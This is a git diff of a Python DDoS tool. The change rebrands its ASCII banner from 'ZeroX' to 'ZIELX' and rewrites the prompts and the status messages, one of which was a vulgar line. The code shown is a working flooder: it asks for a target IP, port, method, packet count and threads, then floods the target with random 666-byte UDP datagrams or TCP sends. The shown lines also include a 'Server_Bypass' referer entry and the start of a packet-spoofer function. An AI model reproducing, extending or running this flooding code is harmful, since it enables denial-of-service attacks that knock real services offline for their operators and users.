@@ -173,20 +173,20 @@ referers = [
      'Server_Bypass_By_ZeroX',]
 
 print("""\033[94m
-███████╗███████╗██████╗░░█████╗░██╗░░██╗
-╚════██║██╔════╝██╔══██╗██╔══██╗╚██╗██╔╝
-░░███╔═╝█████╗░░██████╔╝██║░░██║░╚███╔╝░
-██╔══╝░░██╔══╝░░██╔══██╗██║░░██║░██╔██╗░
-███████╗███████╗██║░░██║╚█████╔╝██╔╝╚██╗
-╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-    | UDP Attack Credit By ZeroX |
-        |Methods = UDP atau TCP|
+███████╗██╗███████╗██╗░░░░░██╗░░██╗
+╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝
+░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░
+██╔══╝░░██║██╔══╝░░██║░░░░░░██╔██╗░
+███████╗██║███████╗███████╗██╔╝╚██╗
+╚══════╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
+    | Tools DDoS Credit By ZIELX |
+         |Methods = UDP-TCP|
 """)
-ip = str(input("\033[94m Ip target \033[1;31;40m  ====> : "))
-port = int(input(" \033[94mPort Target \033[1;31;40m====> : "))
-choice = str(input(" \033[94mMethods \033[1;31;40m    ====> : "))
-times = int(input(" \033[94mPaket \033[1;31;40m      ====> : "))
-threads = int(input("\033[94m Threads \033[1;31;40m    ====> : "))
+ip = str(input("\033[94m IP TARGET \033[1;31;40m  ====> : "))
+port = int(input(" \033[94mPORT TARGET \033[1;31;40m====> : "))
+choice = str(input(" \033[94m METHODS \033[1;31;40m    ====> : "))
+times = int(input(" \033[94m TIMES \033[1;31;40m      ====> : "))
+threads = int(input("\033[94m THREADS \033[1;31;40m    ====> : "))
 
 def run():
 	data = random._urandom(666)
@@ -196,9 +196,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(" 0xF1 Dika %s Kontol %s"%(ip,port))
+			print(" ZIELX ATTACKING IP %s PORT %s"%(ip,port))
 		except:
-			print(" 0xF1 Dika %s Kontol %s"%(ip,port))
+			print(" ZIELX ATTACKING IP %s PORT %s"%(ip,port))
 
 def tcp():
 	data = random._urandom(666)
@@ -211,7 +211,7 @@ def tcp():
 				s.send(data)
 		except:
 			s.close()
-			print("\033[1;31;40m 0xF1 Dika %s Kontol %s"%(ip,port))
+			print("\033[1;31;40m ZIELX ATTACKING IP %s PORT %s"%(ip,port))
 
 def spoofer():
     addr = [192, 168, 0, 1]
